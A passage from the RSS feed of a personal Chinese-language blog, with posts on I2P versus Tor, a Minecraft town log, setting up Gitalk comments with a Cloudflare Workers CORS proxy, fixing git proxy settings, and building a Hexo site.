&lt;h1 id="大蒜路由i2p">大蒜路由I2P&lt;/h1>
&lt;p>tor是匿名通信的鼻祖，但还是有比较明显的缺陷：
（1）上面提到的目录服务器。一旦被防火墙ban，tor浏览器分分钟失效
（2）一旦建立通信连接，双方用这条线路互相传数据；使用时间稍微长一点的话，有一定的概率被猜到；
为了解决这些痛点，大蒜路由孕育而生！
I2P使用 Kad 算法（用过电驴或电骡的网友应该听说过）来获取网络节点的信息，将传输的原始数据拆散为加密数据包通过多条隧道交叉疏散传递，其优势如下：&lt;/p></description></item><item><title>Minecraft 小镇建设日志</title><link>https://littlestate.github.io/posts/minecraft-%E5%B0%8F%E9%95%87%E5%BB%BA%E8%AE%BE%E6%97%A5%E5%BF%97/</link><pubDate>Sun, 30 May 2021 05:55:07 +0000</pubDate><guid>https://littlestate.github.io/posts/minecraft-%E5%B0%8F%E9%95%87%E5%BB%BA%E8%AE%BE%E6%97%A5%E5%BF%97/</guid><description>&lt;center>IP(内网) : 172.17.216.183&lt;/center>
&lt;!-- more -->
&lt;hr>
&lt;h1 id="基地">基地&lt;/h1>
&lt;h2 id="矿工之家">矿工之家&lt;/h2>
&lt;p>&lt;img loading="lazy" src="https://littlestate.github.io/posts/minecraft-%E5%B0%8F%E9%95%87%E5%BB%BA%E8%AE%BE%E6%97%A5%E5%BF%97/%E5%9C%B0%E4%B8%8B.png">&lt;/p>
&lt;ul>
&lt;li>刷经验&lt;/li>
&lt;li>附魔台&lt;/li>
&lt;li>地狱门&lt;/li>
&lt;li>小型农场&lt;/li>
&lt;li>竹林&lt;/li>
&lt;li>天然废弃矿洞&lt;/li>
&lt;li>仓库（迁移中）&lt;/li>
&lt;/ul>
&lt;h2 id="平原基地">平原基地&lt;/h2>
&lt;p>&lt;img loading="lazy" src="https://littlestate.github.io/posts/minecraft-%E5%B0%8F%E9%95%87%E5%BB%BA%E8%AE%BE%E6%97%A5%E5%BF%97/%E5%B9%B3%E5%8E%9F.png">&lt;/p>
&lt;ul>
&lt;li>村庄&lt;/li>
&lt;li>附魔台&lt;/li>
&lt;li>地狱门&lt;/li>
&lt;/ul>
&lt;h1 id="基础设施">基础设施&lt;/h1>
&lt;h2 id="铁路建设中">铁路（建设中）&lt;/h2>
&lt;center>平原->地下基地&lt;/center>
&lt;p>&lt;img loading="lazy" src="https://littlestate.github.io/posts/minecraft-%E5%B0%8F%E9%95%87%E5%BB%BA%E8%AE%BE%E6%97%A5%E5%BF%97/%E9%93%81%E8%B7%AF.png">&lt;/p>
&lt;h1 id="计划中">计划中&lt;/h1>
&lt;ul>
&lt;li>农场&lt;/li>
&lt;li>牧场&lt;/li>
&lt;li>冰堡&lt;/li>
&lt;li>1:1 还原学校&lt;/li>
&lt;/ul>
&lt;h1 id="居民">居民&lt;/h1>
&lt;blockquote>
&lt;p>XiaoBang：普通民众
Fritz1u：建筑师
NTYngln：工程师&lt;/p>
&lt;/blockquote>
&lt;iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&amp;id=1810167836&amp;auto=1&amp;height=66">&lt;/iframe></description></item><item><title>GITALK</title><link>https://littlestate.github.io/posts/gitalk/</link><pubDate>Sun, 30 May 2021 04:02:15 +0000</pubDate><guid>https://littlestate.github.io/posts/gitalk/</guid><description>&lt;p>为小窝增加评论系统&lt;/p>
&lt;!-- more -->
&lt;h1 id="部署-gitalk">部署 GITALK&lt;/h1>
&lt;ol>
&lt;li>首先创建 &lt;a href="https://github.com/settings/applications/new">Github Application&lt;/a>&lt;/li>
&lt;/ol>
&lt;p>&lt;img loading="lazy" src="https://littlestate.github.io/posts/gitalk/githubapp.jpg">&lt;/p>
&lt;ol start="2">
&lt;li>GITALK 配置&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-yml" data-lang="yml">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">enable&lt;/span>: &lt;span style="color:#66d9ef">true&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">github_id&lt;/span>: &lt;span style="color:#ae81ff">&amp;lt;Github 账号&amp;gt;&lt;/span> &lt;span style="color:#75715e"># GitHub repo owner&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">repo&lt;/span>: &lt;span style="color:#ae81ff">&amp;lt;用来存放评论的仓库&amp;gt;&lt;/span> &lt;span style="color:#75715e"># Repository name to store issues&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">client_id&lt;/span>: &lt;span style="color:#ae81ff">&amp;lt;上面注册的&amp;gt;&lt;/span> &lt;span style="color:#75715e"># GitHub Application Client ID&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">client_secret&lt;/span>: &lt;span style="color:#ae81ff">&amp;lt;&amp;lt;上面注册的&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#75715e"># GitHub Application Client Secret&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">admin_user&lt;/span>: &lt;span style="color:#ae81ff">&amp;lt;初始化仓库的账号&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">proxy&lt;/span>: &lt;span style="color:#ae81ff">https://cors-anywhere.herokuapp.com/https://github.com/login/oauth/access_token&lt;/span> &lt;span style="color:#75715e"># This is official proxy adress&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
&lt;li>Workers 配置&lt;/li>
&lt;/ol>
&lt;pre tabindex="0">&lt;code> whitelist = [ &amp;#34;.*&amp;#34; ] # 所有请求可用
whitelist = [ &amp;#34;^http.?://littlestate.github.io$&amp;#34;, &amp;#34;littlestate.github.io$&amp;#34; ]
&lt;/code>&lt;/pre>&lt;ol start="4">
&lt;li>最后一步
将 &lt;code>https://cors-anywhere.herokuapp.com&lt;/code> 替换为 Workers 中右边的地址&lt;/li>
&lt;/ol>
&lt;h2 id="让标签和分类页不显示-gitalk-评论框">让标签和分类页不显示 GITALK 评论框&lt;/h2>
&lt;ul>
&lt;li>在 &lt;code>hexo/source&lt;/code> 下 &lt;code>tags&lt;/code>、&lt;code>categories&lt;/code> &lt;strong>文件夹&lt;/strong>内的 &lt;code>index.md&lt;/code> 中添加&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-yml" data-lang="yml">&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">comments&lt;/span>: &lt;span style="color:#66d9ef">false&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h1 id="参考">参考&lt;/h1>
&lt;ol>
&lt;li>&lt;a href="https://www.chenhanpeng.com/create-own-cors-anywhere-to-resolve-the-request-with-403/">使用 CloudFlare Workers 反向代理&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/Hanpeng-Chen/cloudflare-cors-anywhere/blob/master/index.js">cors-anywhere 框架&lt;/a>&lt;/li>
&lt;/ol></description></item><item><title>子网划分</title><link>https://littlestate.github.io/posts/%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86/</link><pubDate>Fri, 14 May 2021 09:12:44 +0000</pubDate><guid>https://littlestate.github.io/posts/%E5%AD%90%E7%BD%91%E5%88%92%E5%88%86/</guid><description>&lt;p>&amp;hellip;&lt;/p></description></item><item><title>VSCODE 配置</title><link>https://littlestate.github.io/posts/vscode-%E9%85%8D%E7%BD%AE/</link><pubDate>Fri, 12 Mar 2021 20:39:17 +0000</pubDate><guid>https://littlestate.github.io/posts/vscode-%E9%85%8D%E7%BD%AE/</guid><description>&lt;p>记录一些 VSCODE 配置&lt;/p></description></item><item><title>初识 Git</title><link>https://littlestate.github.io/posts/%E5%88%9D%E8%AF%86-git/</link><pubDate>Fri, 12 Mar 2021 20:39:16 +0000</pubDate><guid>https://littlestate.github.io/posts/%E5%88%9D%E8%AF%86-git/</guid><description>&lt;p>第一次使用Git&lt;/p></description></item><item><title>修改 Git 代理设置出现的问题</title><link>https://littlestate.github.io/posts/%E4%BF%AE%E6%94%B9-git-%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE%E5%87%BA%E7%8E%B0%E7%9A%84%E9%97%AE%E9%A2%98/</link><pubDate>Sun, 07 Mar 2021 09:11:47 +0000</pubDate><guid>https://littlestate.github.io/posts/%E4%BF%AE%E6%94%B9-git-%E4%BB%A3%E7%90%86%E8%AE%BE%E7%BD%AE%E5%87%BA%E7%8E%B0%E7%9A%84%E9%97%AE%E9%A2%98/</guid><description>&lt;p>关于我因 git clone 慢而去给 git 设置代理而引发的那些事&lt;/p>
&lt;!-- more -->
&lt;h2 id="使用到的命令">使用到的命令&lt;/h2>
&lt;pre tabindex="0">&lt;code>$ git config -l 查看所有配置
$ git config --global -l
&lt;/code>&lt;/pre>&lt;h2 id="过程">过程&lt;/h2>
&lt;p>按着 &lt;a href="https://juejin.cn/post/6844903862961176583">一招 git clone 加速&lt;/a> 这篇文章设置了 git 的代理但是没用（应该是自己没设置正确），现在想想应该是当时没有 reset 仅代理 github 的配置，导致从 github 上下载项目时还是走错误的代理设置。
&lt;strong>当时使用这两个命令重置&lt;/strong> 。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ git config --global --unset http.proxy
$ git config --global --unset https.proxy
&lt;/code>&lt;/pre>&lt;p>因为以上的问题，还影响到了 hexo 的一些操作，比如 deploy 和 init。&lt;/p>
&lt;p>尝试一番发现（还卸载重装了 git）只是因为第一步使用 reset 只是重置了这两项，还有两条仅代理 github 的配置没有重置。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ git config --global http.proxy http://127.0.0.1:1081
$ git config --global https.proxy https://127.0.0.1:1081
&lt;/code>&lt;/pre>&lt;p>&lt;strong>使用这两条命令重置代理 github 的配置。&lt;/strong>&lt;/p></description></item><item><title>Hello World</title><link>https://littlestate.github.io/posts/hello-world/</link><pubDate>Sat, 06 Mar 2021 15:05:18 +0000</pubDate><guid>https://littlestate.github.io/posts/hello-world/</guid><description>&lt;p>Welcome to &lt;a href="https://hexo.io/">Hexo&lt;/a>! This is your very first post. Check &lt;a href="https://hexo.io/docs/">documentation&lt;/a> for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href="https://hexo.io/docs/troubleshooting.html">troubleshooting&lt;/a> or you can ask me on &lt;a href="https://github.com/hexojs/hexo/issues">GitHub&lt;/a>.&lt;/p>
&lt;h2 id="quick-start">Quick Start&lt;/h2>
&lt;h3 id="create-a-new-post">Create a new post&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ hexo new &lt;span style="color:#e6db74">&amp;#34;My New Post&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>More info: &lt;a href="https://hexo.io/docs/writing.html">Writing&lt;/a>&lt;/p>
&lt;h3 id="run-server">Run server&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ hexo server
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>More info: &lt;a href="https://hexo.io/docs/server.html">Server&lt;/a>&lt;/p>
&lt;h3 id="generate-static-files">Generate static files&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ hexo generate
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>More info: &lt;a href="https://hexo.io/docs/generating.html">Generating&lt;/a>&lt;/p>
&lt;h3 id="deploy-to-remote-sites">Deploy to remote sites&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ hexo deploy
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>More info: &lt;a href="https://hexo.io/docs/one-command-deployment.html">Deployment&lt;/a>&lt;/p></description></item><item><title>Hexo 搭建日记</title><link>https://littlestate.github.io/posts/hexo-%E6%90%AD%E5%BB%BA%E6%97%A5%E8%AE%B0/</link><pubDate>Sat, 06 Mar 2021 15:05:18 +0000</pubDate><guid>https://littlestate.github.io/posts/hexo-%E6%90%AD%E5%BB%BA%E6%97%A5%E8%AE%B0/</guid><description>&lt;p>记录一下第一次搭建 Hexo 的各种问题&lt;/p>
&lt;!-- more -->
&lt;h2 id="教程">教程&lt;/h2>
&lt;ol>
&lt;li>&lt;a href="https://hexo.io/zh-cn/">Hexo 官方教程&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://zhuanlan.zhihu.com/p/26625249">GitHub+Hexo 搭建个人网站详细教程&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://zhuanlan.zhihu.com/p/35668237">超详细 Hexo+Github 博客搭建小白教程&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://aiellochan.com/2018/02/13/hexo/Hexo-%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%A4%9A%E4%B8%AA-categories/">多级 categories&lt;/a>&lt;/li>
&lt;/ol>
&lt;h3 id="hexo-基本操作">hexo 基本操作：&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ hexo g &lt;span style="color:#75715e">#生成静态文件&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ hexo new &lt;span style="color:#f92672">[&lt;/span>layout&lt;span style="color:#f92672">]&lt;/span> &amp;lt;title&amp;gt; &lt;span style="color:#75715e">#layout 有post、draft、page&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ hexo s &lt;span style="color:#75715e">#启动本地 Server&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ hexo deploy &lt;span style="color:#75715e">#可简写为d&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="配置文件">配置文件&lt;/h2>
&lt;h3 id="站点配置文件">站点配置文件：&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-yml" data-lang="yml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">$ line_number&lt;/span>: &lt;span style="color:#66d9ef">false&lt;/span> &lt;span style="color:#75715e">#不显示代码块序号&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">$ post_asset_folder&lt;/span>: &lt;span style="color:#66d9ef">true&lt;/span> &lt;span style="color:#75715e">#新建 post 文章时会顺带创建一个文件夹，用来存素材&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="主题配置文件">主题配置文件：&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-yml" data-lang="yml">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">$ scheme&lt;/span>: &lt;span style="color:#ae81ff">Gemini &lt;/span> &lt;span style="color:#75715e">#主题布局&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">$ busuanzi_count: enable&lt;/span>: &lt;span style="color:#66d9ef">true&lt;/span> &lt;span style="color:#75715e">#开启访问统计&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">$ copy_button: enable&lt;/span>: &lt;span style="color:#66d9ef">true&lt;/span> &lt;span style="color:#75715e">#开启代码块一键复制&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">$ creative_commons&lt;/span>: &lt;span style="color:#75715e">#增加版权信息&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="主题">主题&lt;/h2>
&lt;ol>
&lt;li>&lt;a href="https://blog.mrzorg.top/Hexo/2020-02-12-hero-next-theme-settings/">主题美化&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://forestneo.com/2018/12/01/%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE-Hexo-NexT%E4%B8%BB%E9%A2%98%E9%BC%A0%E6%A0%87%E7%82%B9%E5%87%BB%E7%88%B1%E5%BF%83%E7%89%B9%E6%95%88/">设置点击爱心&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://theme-next.iissnan.com/">NexT (目前)&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://volantis.js.org/">Volantis&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://github.com/Mogeko/mogege">Hugo主题-Mogeko&lt;/a>&lt;/li>
&lt;/ol>
&lt;h2 id="遇到的一些问题">遇到的一些问题&lt;/h2>
&lt;p>&lt;a href="https://www.cnblogs.com/lfri/p/12221359.html">Hexo next 主题配置右侧栏的分类和标签打开的是空白&lt;/a>&lt;/p></description></item></channel></rss>